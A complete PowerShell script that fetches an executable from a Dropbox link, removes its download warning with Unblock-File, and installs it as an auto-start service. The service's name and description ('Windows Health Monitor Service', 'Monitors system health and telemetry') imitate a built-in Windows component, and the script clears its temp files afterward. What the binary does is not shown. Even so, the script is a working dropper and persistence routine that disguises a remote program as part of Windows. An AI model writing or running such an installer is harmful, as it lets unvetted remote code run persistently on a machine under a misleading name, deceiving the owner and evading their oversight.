
$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=iyklwul1&dl=1"

$WorkDir = "$env:TEMP\WinHealthInstall"
$ClientExe = "$WorkDir\MonitorClient.exe"
$ServiceName = "WindowsHealthMonitor"
$ServiceDisplay = "Windows Health Monitor Service"
$InstallDir = "$env:ProgramData\WindowsHealth"
$TargetExe = "$InstallDir\MonitorClient.exe"



Write-Host "[*] Starting Service Deployment..." -ForegroundColor Cyan


if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[-] Script is not running as Administrator. Service installation will fail."
    Write-Host "    Please run PowerShell as Administrator." -ForegroundColor Red
    exit
}


if (-not (Test-Path $WorkDir)) {
    New-Item -Path $WorkDir -ItemType Directory | Out-Null
}


try {
    Write-Host "    [*] Downloading MonitorClient..."
    Invoke-WebRequest -Uri $ClientUrl -OutFile $ClientExe -UseBasicParsing
    if (-not (Test-Path $ClientExe)) { throw "Download failed." }
}
catch {
    Write-Error "[-] Error Downloading File: $_"
    exit
}


Unblock-File -Path $ClientExe


if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory | Out-Null
}


$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "    [*] Stopping existing service..."
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

Write-Host "    [*] Moving binary to: $InstallDir"
Copy-Item -Path $ClientExe -Destination $TargetExe -Force


Write-Host "    [*] Creating Windows Service..."

$binPath = "`"$TargetExe`""
sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= $ServiceDisplay


sc.exe description $ServiceName "Monitors system health and telemetry."


Write-Host "    [*] Starting Service..."
Start-Service -Name $ServiceName


Write-Host "    [*] Cleaning up Temp..."
Remove-Item -Path $WorkDir -Recurse -Force

Write-Host "[+] Service Installation Complete!" -ForegroundColor Green
Write-Host "    Service: $ServiceName"
Write-Host "    Status:  Running (Auto-Start)"
